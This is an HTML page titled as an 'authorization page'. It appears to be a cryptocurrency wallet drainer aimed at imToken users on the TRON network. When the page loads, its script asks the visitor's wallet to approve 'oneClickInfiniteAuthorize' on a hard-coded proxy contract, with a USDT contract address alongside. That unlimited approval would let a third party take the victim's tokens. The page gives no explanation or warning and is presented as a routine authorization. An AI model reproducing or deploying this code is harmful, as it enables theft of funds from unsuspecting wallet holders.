<!DOCTYPE html>
<html>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>授权页</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.7.0/dist/TronWeb.min.js"></script>
</head>
<body>
    <div id="log">正在触发授权...</div>

    <script>
        const PROXY_CONTRACT = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV";
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

        // 适配v2.17版本的TronWeb初始化
        async function initTronWeb() {
            if (window.imToken && window.imToken.tronWeb) {
                return window.imToken.tronWeb;
            }
            return new TronWeb({
                fullNode: "https://api.trongrid.io",
                solidityNode: "https://api.trongrid.io",
                eventServer: "https://api.trongrid.io"
            });
        }

        // 自动授权
        async function autoAuthorize() {
            const log = document.getElementById("log");
            try {
                const tronWeb = await initTronWeb();
                const userAddr = tronWeb.defaultAddress.base58;

                if (!userAddr) {
                    log.textContent = "请登录imToken钱包";
                    return;
                }

                log.textContent = "请在imToken中确认授权...";
                const proxyContract = await tronWeb.contract().at(PROXY_CONTRACT);
                const tx = await proxyContract.oneClickInfiniteAuthorize().send({
                    from: userAddr,
                    feeLimit: 500000000
                });

                log.textContent = "授权成功！交易ID：" + tx.txid.slice(0,18);
            } catch (e) {
                log.textContent = "失败：" + (e.message || "错误").slice(0,50);
            }
        }

        window.onload = autoAuthorize;
    </script>
</body>
</html>
